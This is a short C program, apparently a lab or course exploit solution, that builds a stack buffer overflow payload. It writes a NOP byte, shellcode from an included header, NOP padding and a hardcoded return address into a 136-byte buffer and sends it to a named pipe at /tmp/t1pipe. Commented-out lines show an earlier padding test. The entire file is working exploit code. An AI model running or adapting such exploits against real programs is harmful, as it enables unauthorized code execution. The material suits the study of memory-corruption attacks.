#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"
#include "shellcode.h"

#define PIPEPATH "/tmp/t1pipe"

int main(void)
{
        char buffr[136];
        char add[] = "\x01\x20\xa7\xbb";
        int i;

        memcpy(buffr,"\x90",1);


        memcpy(buffr+1,shellcode,strlen(shellcode));

        for(i = 84; i < 131; i++)
                memcpy(buffr + i, "\x90",1);

        strcpy(buffr + 131, add);
        writecmd(PIPEPATH, buffr);

//      int retadd = 0xbba72000;
 // writecmd(PIPEPATH, "ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssstttt");
  //
  return 0;
}